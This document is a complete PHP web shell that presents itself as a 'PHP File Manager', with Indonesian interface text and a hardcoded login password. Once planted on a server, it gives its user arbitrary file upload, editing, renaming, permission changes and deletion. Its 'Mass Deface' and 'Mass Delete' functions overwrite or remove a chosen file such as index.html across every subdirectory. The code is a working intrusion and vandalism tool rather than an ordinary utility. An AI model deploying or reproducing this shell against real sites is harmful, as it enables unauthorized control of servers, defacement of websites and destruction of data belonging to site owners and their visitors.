<?php
session_start();
$password = '290802as';

if (isset($_POST['login'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo "<p style='color:red;'>Password salah!</p>";
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo "<!DOCTYPE html><html><head><title>Login</title><style>
    body { background:#111; color:#0f0; font-family:Arial; }
    input, button { background:#222; color:#0f0; border:1px solid #0f0; padding:5px; }
    </style></head><body><h2>Login</h2>
    <form method='POST'>
        <input type='password' name='pass' placeholder='Password'><br>
        <button type='submit' name='login'>Login</button>
    </form></body></html>";
    exit;
}

error_reporting(0);
set_time_limit(0);
echo "<!DOCTYPE html><html><head><title>PHP File Manager</title><style>
body { font-family: Arial; background: #111; color: #0f0; }
a { color: #0f0; text-decoration: none; }
input, textarea, button { background: #222; color: #0f0; border: 1px solid #0f0; margin: 5px 0; }
.small-chmod-input { width: 60px; display: inline-block; margin-left: 5px; }
</style></head><body>";

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
if (!$path || !is_dir($path)) { echo "<p>Invalid path</p>"; exit; }

echo "<h2>Path: ";
$parts = explode(DIRECTORY_SEPARATOR, $path);
$build = "";
foreach ($parts as $index => $part) {
    if ($part === "") {
        $build = DIRECTORY_SEPARATOR;
        echo "<a href='?path=" . urlencode($build) . "'>/</a>";
        continue;
    }
    $build .= ($build == DIRECTORY_SEPARATOR ? "" : DIRECTORY_SEPARATOR) . $part;
    echo " <a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a> /";
}
echo "</h2>";

echo "<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='file'><button type='submit' name='upload'>Upload</button>
</form>";

// --- Form untuk membuat file baru ---
echo "<form method='POST'>
    <input type='text' name='new_filename' placeholder='Nama file baru (cth: newfile.txt)' required>
    <textarea name='new_file_content' rows='5' placeholder='Isi file (opsional)...'></textarea>
    <button type='submit' name='create_file'>Buat File Baru</button>
</form>";
// --- End Form membuat file baru ---

echo "<form method='POST'>
    <input type='text' name='deface_filename' placeholder='Nama file deface (cth: index.html)' required>
    <textarea name='deface_content' rows='5' placeholder='Isi HTML deface kamu...'></textarea>
    <button type='submit' name='mass_deface'>Mass Deface</button>
</form>";

echo "<form method='POST'>
    <input type='text' name='delete_filename' placeholder='Nama file untuk dihapus massal (cth: index.html)' required>
    <button type='submit' name='mass_delete'>Mass Delete File</button>
</form>";

if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $path . DIRECTORY_SEPARATOR . $_FILES['file']['name'];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<p>Upload success</p>";
    } else {
        echo "<p>Upload failed</p>";
    }
}

// --- Logika untuk membuat file baru ---
if (isset($_POST['create_file'])) {
    $filename = trim($_POST['new_filename']);
    $content = $_POST['new_file_content'];
    if (!$filename) {
        echo "<p style='color:red;'>Nama file tidak boleh kosong!</p>";
    } else {
        $targetFile = $path . DIRECTORY_SEPARATOR . $filename;
        if (file_exists($targetFile)) {
            echo "<p style='color:orange;'>File '$filename' sudah ada. Mengganti isi file yang sudah ada.</p>";
        }
        if (file_put_contents($targetFile, $content) !== false) {
            echo "<p style='color:lightgreen;'>File '$filename' berhasil dibuat/diperbarui.</p>";
        } else {
            echo "<p style='color:red;'>Gagal membuat/memperbarui file '$filename'. Pastikan izin tulis.</p>";
        }
    }
}
// --- End Logika membuat file baru ---

if (isset($_POST['mass_deface'])) {
    $filename = trim($_POST['deface_filename']);
    $content = $_POST['deface_content'];
    if (!$filename || !$content) {
        echo "<p style='color:red;'>Nama file dan konten tidak boleh kosong!</p>";
    } else {
        $dirs = scandir($path);
        $count = 0;
        foreach ($dirs as $dir) {
            if ($dir === '.' || $dir === '..') continue;
            $fullDir = $path . DIRECTORY_SEPARATOR . $dir;
            if (is_dir($fullDir)) {
                $targetFile = $fullDir . DIRECTORY_SEPARATOR . $filename;
                if (file_put_contents($targetFile, $content)) {
                    echo "<p>Defaced: $targetFile</p>";
                    $count++;
                }
            }
        }
        echo "<p style='color:lightgreen;'>Selesai! Total folder: $count</p>";
    }
}

if (isset($_POST['mass_delete'])) {
    $filename = trim($_POST['delete_filename']);
    if (!$filename) {
        echo "<p style='color:red;'>Nama file tidak boleh kosong!</p>";
    } else {
        $dirs = scandir($path);
        $count = 0;
        foreach ($dirs as $dir) {
            if ($dir === '.' || $dir === '..') continue;
            $fullDir = $path . DIRECTORY_SEPARATOR . $dir;
            $targetFile = $fullDir . DIRECTORY_SEPARATOR . $filename;
            if (is_dir($fullDir) && file_exists($targetFile)) {
                if (unlink($targetFile)) {
                    echo "<p>Dihapus: $targetFile</p>";
                    $count++;
                }
            }
        }
        echo "<p style='color:orange;'>Selesai hapus file dari $count folder</p>";
    }
}

if (isset($_GET['delete'])) {
    $del = realpath($_GET['delete']);
    if (strpos($del, $path) === 0 && is_file($del)) {
        unlink($del);
        echo "<p>File deleted</p>";
    }
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $full = realpath($file);
    if (strpos($full, $path) === 0 && is_file($full)) {
        if (isset($_POST['newcontent'])) {
            file_put_contents($full, $_POST['newcontent']);
            echo "<p>File updated</p>";
        }
        $content = htmlspecialchars(file_get_contents($full));
        echo "<h3>Editing: " . basename($full) . "</h3>
        <form method='POST'>
            <textarea name='newcontent' rows='20'>$content</textarea>
            <button type='submit'>Save</button>
        </form>";
        exit;
    }
}

if (isset($_GET['rename'])) {
    $old = realpath($_GET['rename']);
    if (strpos($old, $path) === 0 && is_file($old)) {
        echo "<h3>Rename: " . basename($old) . "</h3>
        <form method='POST'>
            <input type='hidden' name='oldname' value='" . htmlspecialchars($old) . "'>
            <input type='text' name='newname' placeholder='New file name'>
            <button type='submit' name='renamethis'>Rename</button>
        </form>";
        exit;
    }
}

if (isset($_POST['renamethis'])) {
    $old = $_POST['oldname'];
    $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if (file_exists($old)) {
        if (rename($old, $new)) {
            echo "<p>File renamed to: " . htmlspecialchars(basename($new)) . "</p>";
        } else {
            echo "<p>Rename failed</p>";
        }
    }
}

if (isset($_POST['chmod_inline'])) {
    $file = $_POST['file'];
    $mode = intval($_POST['mode'], 8);
    $target = realpath($file);
    if ($target && strpos($target, $path) === 0 && file_exists($target)) {
        if (chmod($target, $mode)) {
            echo "<p>CHMOD sukses: $file ke " . $_POST['mode'] . "</p>";
        } else {
            echo "<p style='color:red;'>CHMOD gagal</p>";
        }
    }
}

$files = scandir($path);
echo "<ul>";
foreach ($files as $file) {
    if ($file === ".") continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $href = htmlspecialchars($_SERVER['PHP_SELF'] . '?path=' . urlencode($full));
    if (is_dir($full)) {
        echo "<li>[DIR] <a href='$href'>$file</a></li>";
    } else {
        $edit = htmlspecialchars($_SERVER['PHP_SELF'] . '?path=' . urlencode($path) . '&edit=' . urlencode($full));
        $del = htmlspecialchars($_SERVER['PHP_SELF'] . '?path=' . urlencode($path) . '&delete=' . urlencode($full));
        $ren = htmlspecialchars($_SERVER['PHP_SELF'] . '?path=' . urlencode($path) . '&rename=' . urlencode($full));

        echo "<li>$file - 
        <a href='$edit'>Edit</a> | 
        <a href='$ren'>Rename</a> | 
        <a href='$del' onclick='return confirm(\"Delete?\")'>Delete</a> | 
        <form method='POST' style='display:inline;'>
            <input type='hidden' name='file' value='" . htmlspecialchars($full) . "'>
            <input type='text' name='mode' class='small-chmod-input' placeholder='0755' pattern='[0-7]{3,4}' required>
            <button type='submit' name='chmod_inline'>CHMOD</button>
        </form>
        </li>";
    }
}
echo "</ul>";
echo "</body></html>";
?>